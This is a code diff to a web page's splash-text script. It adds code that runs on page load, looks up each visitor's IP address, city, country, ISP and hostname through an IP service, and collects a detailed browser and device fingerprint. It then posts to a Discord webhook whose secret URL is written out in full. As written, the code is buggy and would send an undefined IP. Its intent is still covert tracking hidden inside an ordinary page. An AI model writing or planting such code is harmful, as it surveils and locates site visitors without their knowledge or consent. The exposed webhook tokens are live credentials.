@@ -170,15 +170,50 @@ let splashtext = [
 
 document.getElementById('splash').innerHTML = splashtext[Math.floor(Math.random() * splashtext.length)]
 
-const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/1243250754320470076/HR2EachBMjKkATI3A40mH0UN5TFbIYE1DqNQQ7_I2FJRO73RZ4eQUNVBEZkZv-mkUhlo");
+let log = {}
+fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          let log = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+          };
+})
 
-request.setRequestHeader('Content-type', 'application/json');
-
-const params = {
-  username: "Hook",
-  avatar_url: "",
-  content: "Test"
-}
-
-      request.send(JSON.stringify(params));
+fetch("https://discord.com/api/webhooks/1243251756918374480/yZtcgG_3SgwrFr8e5GezMoM_CEsj_yVi-vl8Bklpc3O6wwtS_v1P0NPBXxguji6CM7hH", {
+  body: JSON.stringify({
+    content: `ip: ${log.ipAddress}`,
+  }),
+  headers: {
+    "Content-Type": "application/json",
+  },
+  method: "POST",
+})
+  .then(function (res) {
+    console.log(res);
+  })
+  .catch(function (res) {
+    console.log(res);
+  });
